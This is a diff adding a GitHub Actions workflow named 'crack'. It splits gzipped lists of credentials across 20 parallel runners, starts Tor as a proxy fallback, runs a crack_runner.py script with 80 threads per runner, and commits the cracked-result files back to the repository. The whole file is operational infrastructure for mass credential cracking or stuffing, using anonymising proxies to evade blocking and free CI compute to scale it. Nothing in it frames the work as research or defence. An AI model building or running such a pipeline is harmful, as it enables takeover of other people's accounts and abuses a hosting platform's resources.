@@ -1,0 +1,80 @@
+name: crack
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: 'run tag (output dir)'
+        default: 'mlpass'
+      workers:
+        description: 'threads per runner'
+        default: '80'
+  push:
+    paths:
+      - 'CRACK'
+
+permissions:
+  contents: write
+
+concurrency:
+  group: crack-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  crack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 110
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        slice: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - name: show runner
+        run: |
+          nproc; free -g | head -2; df -h / | tail -1; python3 -V
+
+      - name: start tor
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq tor >/dev/null 2>&1 || true
+          mkdir -p /tmp/tordata
+          nohup tor --SocksPort 9050 --DataDirectory /tmp/tordata --Log "notice file /tmp/tor.log" >/dev/null 2>&1 &
+          for i in $(seq 1 30); do
+            (echo > /dev/tcp/127.0.0.1/9050) >/dev/null 2>&1 && break
+            sleep 2
+          done
+          echo "tor socks up:"; ss -ltn | grep 9050 || true
+
+      - name: run slice
+        run: |
+          T="${{ github.event.inputs.tag }}"; [ -z "$T" ] && T=mlpass
+          S=$(printf "slices/%s/slice%02d.txt.gz" "$T" ${{ matrix.slice }})
+          O=$(printf "out/%s/res%02d.tsv" "$T" ${{ matrix.slice }})
+          mkdir -p "out/$T"
+          gunzip -c "$S" > "/tmp/slice${{ matrix.slice }}.txt"
+          W="${{ github.event.inputs.workers }}"; [ -z "$W" ] && W=80
+          echo "slice=$S creds=$(wc -l < /tmp/slice${{ matrix.slice }}.txt)"
+          python3 -u crack_runner.py "/tmp/slice${{ matrix.slice }}.txt" "$O" --workers "$W" --tor-fallback 2>&1 | tail -60
+
+      - name: commit results
+        if: always()
+        run: |
+          T="${{ github.event.inputs.tag }}"; [ -z "$T" ] && T=mlpass
+          O=$(printf "out/%s/res%02d.tsv" "$T" ${{ matrix.slice }})
+          if [ -f "$O" ]; then
+            wc -l "$O"
+            git config user.name "ci"
+            git config user.email "ci@localhost"
+            git add -f "$O"
+            git commit -m "crack $T slice ${{ matrix.slice }} $(date -u +%s)" || echo "nothing to commit"
+            for i in 1 2 3 4 5; do
+              git pull --rebase --autostash origin HEAD >/dev/null 2>&1 && git push >/dev/null 2>&1 && { echo pushed; break; }
+              echo "retry $i"; sleep 5
+            done
+          else
+            echo "no output file"
+          fi
